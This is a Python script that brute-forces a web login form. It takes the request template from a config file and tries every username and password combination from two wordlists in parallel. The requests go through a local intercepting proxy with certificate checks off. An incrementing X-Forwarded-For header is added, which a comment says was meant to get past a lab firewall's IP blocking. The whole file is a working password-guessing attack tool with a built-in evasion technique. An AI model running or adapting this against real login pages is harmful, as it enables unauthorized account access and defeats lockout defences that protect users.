import requests
import sys
import os
import multiprocessing
import time
import urllib3
# Disable InsecureRequestWarning ----> occurs because verify_false option at request
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_wordlist_from_file(filename):
    """Reads a wordlist from a given file and returns it as a list."""
    try:
        with open(filename, "r") as file:
            wordlist = file.read().splitlines() 
        return wordlist
    except FileNotFoundError:
        print(f"Error: The file {filename} was not found.")
        sys.exit(1)  

def parse_config_file(config_filename):
    """Parses the configuration file to extract headers, data, and URL."""
    headers = {}
    data = None
    _URL = None

    try:
        with open(config_filename, "r") as file:
            lines = file.read().splitlines()  # Read lines from config file
            _URL = lines[1].split(": ")[1] + lines[0].split(" ")[1]  # Construct URL from lines
            lines = lines[2:]  # Skip the first two lines
            header_part = True
            for line in lines:
                if line == "":
                    header_part = False  # Switch to data part if a blank line is encountered
                    continue
                if header_part:
                    if ": " in line:  # Check if line contains a header
                        key, value = line.split(": ", 1)  # Split header into key-value
                        headers[key] = value
                else:
                    data = line  # The remaining line is considered as data
    except FileNotFoundError:
        print(f"Error: The file {config_filename} was not found.")
        sys.exit(1)  # Exit if file not found

    return headers, data, _URL

def send_request(fuzz1, fuzz2, fuzz3, data, headers, proxies, _URL, lock):
    """Sends a POST request with fuzzed data and logs the response."""
    tempData = data.replace("testUsername", fuzz1).replace("testPassword", fuzz2)  # Replace placeholders in data
    headers["X-Forwarded-For"] = str(fuzz3)  # Set custom header for fuzz3 #bunu lab için ekledim firewallda ip block vardı
    
    try:
        # Send a POST request to the URL with the modified data and headers
        response = requests.post(url=_URL, data=tempData, headers=headers, proxies=proxies, verify=False, allow_redirects=False)

        # Log the request details: fuzzed username, password, status code, response length, and time taken
        log_entry = f"{fuzz1} {fuzz2} Status code: {response.status_code}, Response length: {len(response.content)}, Response time: {response.elapsed.total_seconds()} seconds\n"

        # Use a lock to prevent multiple processes from writing to the file simultaneously
        with lock:
            with open("output.txt", "a") as file:
                file.write(log_entry)

        #if response.status_code == 302:  # If a redirection occurs, pause for user input
            #input()

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")  # Print any request exceptions

def worker(args):
    """Worker function to handle requests in parallel."""
    fuzz1, fuzz2, fuzz3, data, headers, proxies, _URL, lock = args
    send_request(fuzz1, fuzz2, fuzz3, data, headers, proxies, _URL, lock)

def send_request_with_fuzzing(wordlist1, wordlist2, data, headers, proxies, _URL):
    """Creates a pool of workers to send requests with all combinations of fuzzed usernames and passwords."""
    num_processes = multiprocessing.cpu_count()  # Get the number of CPU cores
    pool = multiprocessing.Pool(processes=num_processes)  # Create a pool of workers
    lock = multiprocessing.Manager().Lock()  # Create a lock to manage file writes

    tasks = []
    fuzz3 = 0  # Initialize fuzz3 counter

    # Iterate through each combination of fuzz1 and fuzz2, incrementing fuzz3 for each
    for fuzz1 in wordlist1:
        for fuzz2 in wordlist2:
            tasks.append((fuzz1, fuzz2, fuzz3, data, headers, proxies, _URL, lock))
            fuzz3 += 1  # Increment fuzz3 value

    pool.map(worker, tasks)  # Map the tasks to the worker function
    pool.close()  # Close the pool
    pool.join()  # Wait for all workers to finish

def main():
    """Main function to run the script."""
    default_wordlist1 = "wordlist1.txt"
    default_wordlist2 = "wordlist2.txt"

    # Check if default wordlists exist; if not, use command line arguments
    if not (os.path.exists(default_wordlist1) and os.path.exists(default_wordlist2)):
        print("Warning: wordlist1.txt or wordlist2.txt not found in the current directory.")
        if len(sys.argv) != 3:
            print("Alternative Usage: python script.py <wordlist1.txt> <wordlist2.txt>")
            sys.exit(1)
        default_wordlist1 = sys.argv[1]
        default_wordlist2 = sys.argv[2]

    wordlist1 = get_wordlist_from_file(default_wordlist1)  # Get the first wordlist
    wordlist2 = get_wordlist_from_file(default_wordlist2)  # Get the second wordlist

    config_file = "config.txt"
    headers, data, _URL = parse_config_file(config_file)  # Parse the config file
    _URL = "https://" + _URL  # Prepend "https://" to the URL
    if not headers or not data or not _URL:
        print("Error: Invalid config file format. Ensure headers, data, and URL are properly defined.")
        sys.exit(1)  # Exit if config file is invalid
    else:
        print(headers, data, _URL)  # Print headers, data, and URL for debugging

    # Define proxies 
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    start_time = time.time()  # Start timer

    send_request_with_fuzzing(wordlist1, wordlist2, data, headers, proxies, _URL)  # Execute fuzzing
    end_time = time.time()  # End timer

    print("completed in", end_time - start_time, "seconds")  # Print the total time taken

if __name__ == "__main__":
    main()  
